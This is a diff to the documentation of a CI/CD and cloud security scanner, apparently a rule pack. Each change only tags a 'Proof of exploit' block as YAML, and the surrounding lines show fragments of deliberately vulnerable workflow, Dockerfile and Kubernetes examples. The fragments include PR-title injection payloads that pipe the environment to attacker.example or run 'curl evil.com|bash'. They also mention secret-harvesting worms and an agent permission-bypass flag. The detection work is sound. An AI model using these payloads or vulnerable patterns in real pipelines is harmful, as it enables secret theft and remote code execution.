@@ -450,7 +450,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every stack-create writes a fresh access key
 # and stores the ``SecretAccessKey`` literal in the stack's
 # Outputs. Any IAM principal that can call
@@ -504,7 +504,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a stateful resource carries a plaintext
 # secret literal. The template is committed to git;
 # CloudFormation stores the secret in stack drift / events
@@ -545,7 +545,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the CodeBuild project's VpcConfig points
 # at a subnet whose ``MapPublicIpOnLaunch: true``. The
 # build host gets a public IP for the duration of the
@@ -602,7 +602,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``python:3.12-slim`` is a tag, and tags on
 # Docker Hub are mutable. Python's publishers can (and do)
 # repoint the same tag at a new image on every point
@@ -640,7 +640,7 @@ CMD ["python", "/app/main.py"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an
 # unquoted variable, gives the value full shell-grammar
 # reach. A build arg passed via ``docker build --build-arg
@@ -671,7 +671,7 @@ RUN ./scripts/build-for-target.sh "$TARGET"
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``API_KEY=sk_live_...`` lands in the image's
 # layer history. ``docker history --no-trunc <image>`` (any
 # user who can pull the image) prints the literal value
@@ -709,7 +709,7 @@ RUN --mount=type=secret,id=api_key \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``RUN docker run --privileged`` (or
 # ``--cap-add=SYS_ADMIN``) during image build requires
 # privileged-mode on the BuildKit daemon AND grants the
@@ -747,7 +747,7 @@ COPY --from=builder /out/ /app/
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``COPY .npmrc`` (or ``.aws/credentials`` /
 # ``.kube/config`` / ``.netrc``) bakes the host's local
 # credential file into the image. Anyone who pulls the
@@ -790,7 +790,7 @@ RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ARG NPM_TOKEN`` declares a build argument
 # whose name signals it carries a credential. Build args
 # are visible in ``docker history``, so the value (passed
@@ -830,7 +830,7 @@ RUN --mount=type=secret,id=npm_token \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves and downloads packages over
 # plaintext HTTP, so any network attacker between the
 # build and the registry can substitute a wheel. The
@@ -874,7 +874,7 @@ RUN update-ca-certificates && \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: postinstall in a transitive dep runs with the
 # builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
 FROM node:20@sha256:<digest>
@@ -915,7 +915,7 @@ If the internal registry / API genuinely has a self-signed cert, install the CA 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
 # disables TLS verification for every Node.js process
 # in the container. Any HTTPS call (npm install at
@@ -953,7 +953,7 @@ If the internal index has a self-signed cert, install the CA into the image's tr
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
 # verification for every Python process in the
 # container. pip, requests-via-urllib3, every API call
@@ -995,7 +995,7 @@ If you need to clone from an internal Git server with a self-signed cert, instal
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
 # certificate verification for every clone / fetch. A
 # MITM substitutes the remote's contents on the next
@@ -1034,7 +1034,7 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
 # the empty string, or a non-existent path) neuters the
 # CA bundle Python's requests library consults. Every
@@ -1071,7 +1071,7 @@ CMD ["python", "main.py"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ECR repo with ``imageScanningConfiguration.
 # scanOnPush: false``. Every pushed image lands without
 # a vulnerability scan; the registry's downstream consumers
@@ -1126,7 +1126,7 @@ inspector.enable(resourceTypes=['ECR'])
 
 **Proof of exploit.**
 
-```
+```yaml
 # Tag-pinned reference (vulnerable):
 - uses: tj-actions/changed-files@v45
 
@@ -1162,7 +1162,7 @@ inspector.enable(resourceTypes=['ECR'])
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + checkout PR head =
 # attacker code runs with secrets + write-scope token.
 name: build-pr
@@ -1234,7 +1234,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: PR title interpolated straight into shell.
 name: triage
 on:
@@ -1321,7 +1321,7 @@ Carve-out: secrets leaked to the workflow log (via ``set -x`` shell trace, ``ech
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: token written to a file that survives the
 # step boundary and lands in the upload-artifact bundle.
 jobs:
@@ -1383,7 +1383,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a job requests an OIDC token (``id-token:
 # write``) without an ``environment:`` binding. The token
 # can be minted from any branch or any PR trigger; if the
@@ -1431,7 +1431,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``echo "::set-output name=..."`` (and
 # ``::save-state``) are retired GitHub-Actions workflow
 # commands. GitHub disabled them due to a command-
@@ -1475,7 +1475,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an untrusted-trigger workflow
 # (``pull_request_target`` / ``workflow_run``) ``run``s
 # a local script. The PR head is checked out into the
@@ -1533,7 +1533,7 @@ Out of scope (deliberate carve-out): inline secret references in a command's *ar
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``echo $TOKEN`` (or printing a
 # ``${{ secrets.X }}`` interpolation) prints the masked
 # value to stdout. GitHub masks ``$TOKEN`` with ``***``
@@ -1599,7 +1599,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a PR title containing
 #   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
 # closes the surrounding string, runs Node code against the
@@ -1648,7 +1648,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: workflow_dispatch input picks the runner. A
 # caller who can dispatch the workflow picks ``prod-deploy``
 # (or any other privileged self-hosted label the org owns)
@@ -1697,7 +1697,7 @@ Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; G
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/checkout`` with
 # ``persist-credentials: true`` (the default) writes the
 # runtime ``GITHUB_TOKEN`` into ``.git/config`` as an
@@ -1754,7 +1754,7 @@ Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the workflow re-enables the retired command
 # channel. Any tool output containing ``::set-env::`` (a
 # build log, a downloaded artifact, an upstream test runner)
@@ -1802,7 +1802,7 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: literal username/password embedded in a
 # ``container.credentials`` block (or in a service's
 # credentials). The workflow file is committed to git
@@ -1855,7 +1855,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pinned to a SHA the attacker landed under @v45.
 # (Substitute the actual malicious-commit SHA from the CVE-2025-30066
 # advisory; the registry in _compromised_actions.py carries it.)
@@ -1936,7 +1936,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``uses: rando-user/single-maintainer-action``
 # is a low-star action from a single-maintainer repo,
 # AND the calling job grants ``contents: write`` /
@@ -1988,7 +1988,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + npm install.
 name: pr-build
 on:
@@ -2049,7 +2049,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: caller picks the ref.
 name: build-release
 on:
@@ -2109,7 +2109,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + gh pr checkout.
 name: triage
 on:
@@ -2184,7 +2184,7 @@ Distinct from GHA-019 (token-to-file persistence) and GHA-049 (cross-repo push):
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a build step writes a sibling workflow file.
 # After the next push to the default branch, the new
 # workflow runs with the repo's permissions and propagates.
@@ -2241,7 +2241,7 @@ Pairs with GHA-048 (self-mutation, which catches the *write* into ``.github/work
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every repo the token can write to becomes a
 # propagation target on the next push trigger.
 jobs:
@@ -2308,7 +2308,7 @@ A long-lived ``NPM_TOKEN`` is the fuel a Shai-Hulud-shaped worm needs: once stol
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: long-lived NPM_TOKEN, no environment gate. Any
 # postinstall in a transitive dep reaches the token via the
 # step env and can re-publish other packages the token can
@@ -2379,7 +2379,7 @@ The attack is cache poisoning: an attacker opens a PR whose branch name (``head_
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/cache`` keys on a PR-controllable
 # value (``github.event.pull_request.title`` /
 # ``github.head_ref`` / similar). A fork PR sets the
@@ -2435,7 +2435,7 @@ Documented attack: a PR title of ``${{ secrets.X }}`` inside an ``if: contains(g
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``if: ${{ contains(github.event.issue.title,
 # 'deploy') }}`` evaluates an attacker-controllable string
 # in the expression language. The expression engine
@@ -2495,7 +2495,7 @@ The safe pattern: ``actions/checkout@<sha>`` with ``ssh-key: ${{ secrets.DEPLOY_
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/checkout`` with ``ssh-key:`` and
 # ``persist-credentials: true`` writes the deploy SSH
 # private key into ``.git/config`` (or the ssh-agent
@@ -2553,7 +2553,7 @@ If the caller genuinely needs information derived from a secret (e.g., a build a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a reusable workflow exposes a secret (or a
 # caller-input value) via ``outputs:``. Outputs from a
 # reusable workflow flow back to the caller's workflow
@@ -2618,7 +2618,7 @@ The IOC list is curated and append-only, mirroring the shape of ``_compromised_a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the IOC strings below are literal Shai-Hulud /
 # s1ngularity indicators. A workflow containing any of them
 # is post-compromise evidence, not pre-compromise risk.
@@ -2666,7 +2666,7 @@ Legitimate uses pass: scanner output written to ``${{ github.workspace }}`` or a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the scanner harvests secrets, the pipe sends
 # them to a public collector. The Shai-Hulud postinstall
 # ran an in-line equivalent of this exact pipeline.
@@ -2726,7 +2726,7 @@ Does NOT fire on a clearly-scoped invocation, e.g. ``claude --allowedTools 'Read
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the bypass flag turns the agent into an
 # unattended shell that can read ``${{ secrets.* }}`` and
 # POST anywhere on the internet. This is the s1ngularity
@@ -2840,7 +2840,7 @@ List every scope the consuming steps actually need; a future reader (and an atta
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: token inherits every permission the App
 # install grants on the org (commonly contents: write,
 # packages: write, actions: write, pull-requests: write,
@@ -2908,7 +2908,7 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable trust-policy.json (any repo can assume):
 {
   "Statement": [{
@@ -2952,7 +2952,7 @@ The fire condition is the *order*, capture-then-fetch with no intervening lock o
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: two reads of the PR head, with a gate in
 # between. A contributor force-push between the snapshot
 # and the second checkout lets unreviewed code run with
@@ -3021,7 +3021,7 @@ Pairs with GHA-033 (secret echoed in shell trace) and GHA-087 (derived-value of 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``image: nginx:1.25`` is a mutable tag.
 # Docker Hub's nginx team rebuilds it on every point
 # release; a publisher takeover repoints the tag
@@ -3065,7 +3065,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``hostNetwork: true`` makes the Pod share
 # the node's network namespace. The Pod can sniff every
 # other Pod's traffic on the node, bind privileged
@@ -3106,7 +3106,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``privileged: true`` gives the container the
 # equivalent of root on the node — full ``/dev`` access,
 # every Linux capability, and the ability to bypass
@@ -3168,7 +3168,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pod mounts the host's root filesystem.
 apiVersion: v1
 kind: Pod
@@ -3221,7 +3221,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a literal credential value in a container
 # ``env`` block. The Pod manifest is in etcd; anyone
 # with ``pods/get`` on the namespace reads the value.
@@ -3272,7 +3272,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Kubernetes Secret with credential-shaped
 # literals in ``stringData`` (or base64'd in ``data``).
 # The Secret object is in etcd; ``kubectl get secret
@@ -3322,7 +3322,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a ConfigMap with a credential-shaped
 # value. ConfigMaps are NOT encrypted at rest in etcd
 # (Secrets are, when encryption-at-rest is configured);
@@ -3374,7 +3374,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # With no protection rule on ``main``, a single compromised
 # maintainer credential is enough to ship a tampered build:
 #
@@ -3408,7 +3408,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # With protection but no required reviews, a maintainer can
 # self-approve a tampered change in two clicks:
 #
@@ -3441,7 +3441,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Without code scanning, the only signal that a PR
 # introduces (e.g.) a SQL injection or hardcoded secret
 # comes from the human reviewer:
@@ -3478,7 +3478,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a developer pushes a commit that contains a
 # leaked AWS access key in source code. Without secret
 # scanning enabled, GitHub never surfaces an alert; the
@@ -3543,7 +3543,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``allow_force_pushes: true`` on the
 # default branch's protection. A maintainer (or anyone
 # with write access via a compromised token) can rewrite
@@ -3593,7 +3593,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``allow_deletions: true`` lets anyone with
 # write access delete the default branch entirely. A
 # compromised token (leaked PAT, malicious workflow
@@ -3625,7 +3625,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``enforce_admins: false`` (or its absence)
 # lets repo admins push directly to ``main``, skip
 # required reviews, and bypass status checks. An admin's
@@ -3711,7 +3711,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: secret scanning is enabled but push
 # protection is off. Secrets are surfaced AFTER they hit
 # the remote — the credential is already in history,
@@ -3816,7 +3816,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``default_workflow_permissions: write``
 # means every workflow's ``GITHUB_TOKEN`` starts with
 # repo-write authority. A typo'd ``run:`` (or an
@@ -3857,7 +3857,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``can_approve_pull_request_reviews: true``
 # means a workflow's ``GITHUB_TOKEN`` (or an installation
 # token) can approve a pull request. Combined with the
@@ -3909,7 +3909,7 @@ stringData:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the ``production`` environment has no
 # required reviewers configured. Any workflow that
 # references ``environment: production`` runs without
@@ -3972,7 +3972,7 @@ Complements every branch-protection rule in the pack: without SCM-025, an unaudi
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a write-enabled deploy key sits on the repo
 # for years. The private half lived on a contractor's
 # laptop and was checked into a public gist during a
@@ -4033,7 +4033,7 @@ If the receiving service genuinely cannot handle HTTPS or shared secrets, termin
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the webhook ships events over plaintext
 # HTTP and carries no shared secret. Any network attacker
 # between GitHub and the receiver sniffs the event
@@ -4086,7 +4086,7 @@ Requires admin scope on the repo to enumerate the outside-collaborator list; wit
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an outside collaborator (a contractor, a
 # departed employee whose access wasn't fully revoked,
 # a security-researcher allowed in for a one-off audit)
@@ -4166,7 +4166,7 @@ Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-en
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the repo ruleset names a bypass actor with
 # ``bypass_mode: always``. That actor (typically the
 # ``github-actions[bot]`` or an internal automation
@@ -4231,7 +4231,7 @@ SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-prote
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the ruleset is enforced (governance theater
 # checks pass) but doesn't include a ``pull_request``
 # rule. Pushes to ``main`` still require a PR (via
@@ -4510,7 +4510,7 @@ v1 limitations: only same-job step outputs are tracked; ``jobs.<id>.outputs.*`` 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a producer step writes
 # ``$GITHUB_OUTPUT`` from an untrusted source
 # (``github.event.issue.title`` / ``github.head_ref``);
@@ -4571,7 +4571,7 @@ Same-step interpolations (the producer's own use of ``${{ github.event.* }}`` in
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an ``extract`` job exposes an untrusted
 # value via ``jobs.extract.outputs:`` and a downstream
 # job consumes it via ``needs.extract.outputs.title``
@@ -4632,7 +4632,7 @@ When the callee body is loaded into the same scan (local ``./.github/workflows/<
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the caller workflow passes an untrusted
 # value into a reusable workflow's ``with:`` inputs. The
 # reusable workflow inlines the input into a shell
@@ -4696,7 +4696,7 @@ v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``inclu
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an ``extract`` job writes an untrusted
 # source (``$CI_COMMIT_MESSAGE``) into a dotenv report
 # artifact. GitLab automatically loads dotenv reports
@@ -4749,7 +4749,7 @@ Buildkite meta-data is per-build, not per-step; any step in the same build can r
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a PR titled ``shiny new feature";curl
 # evil.com|bash;"`` lands in the meta-data store via the
 # producer step. The consumer step reads it back into
@@ -4804,7 +4804,7 @@ Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { n
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: Task ``extract`` writes the PR title to a
 # Tekton ``result``; Task ``use`` reads it back and
 # inlines it into a shell command. A PipelineRun whose
@@ -4880,7 +4880,7 @@ v1 limitations: ``workflowTemplateRef:`` cross-document references aren't resolv
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: producer template hands a tainted parameter
 # through outputs.parameters; consumer interpolates it into
 # its own shell.
@@ -4976,7 +4976,7 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: hidden template ``.base`` interpolates
 # ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
 # title) into a ``variables:`` block. Job ``build``
@@ -5021,7 +5021,7 @@ build:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every ``terraform apply`` provisions a long-
 # lived access key and lands the literal
 # ``aws_iam_access_key.ci.secret`` in the state file. Remote
@@ -5082,7 +5082,7 @@ resource "aws_iam_role" "ci" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the password literal lands in the Terraform
 # state file on every apply. Remote S3 backends store state
 # in plaintext unless explicitly encrypted; CI runs that
@@ -5129,7 +5129,7 @@ resource "aws_db_instance" "prod" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``map_public_ip_on_launch = true`` on the
 # subnet means CodeBuild containers get a public IP for the
 # duration of the build. The build host is now reachable
